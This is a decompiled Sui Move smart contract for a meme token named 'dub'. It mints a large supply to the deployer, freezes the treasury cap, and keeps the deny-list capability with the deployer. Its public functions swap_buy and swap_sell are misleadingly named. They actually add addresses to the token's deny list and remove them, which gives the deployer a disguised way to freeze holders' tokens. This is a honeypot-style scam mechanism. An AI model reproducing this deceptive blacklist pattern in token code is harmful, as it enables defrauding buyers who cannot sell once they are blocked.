module 0xd1409c4fb2d99a7c2e2675970e7c7a3b2559b7dfb62e2d78db09ca7f738049a5::dub {
    struct DUB has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DUB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DUB>(arg0, 9, b"dub", b"W", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNuXp3cX79LKR9X8f9svBaEbqdDsR8ieZ7mJe1gxVLf6N"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DUB>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DUB>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DUB>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DUB>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DUB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DUB>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DUB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DUB>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

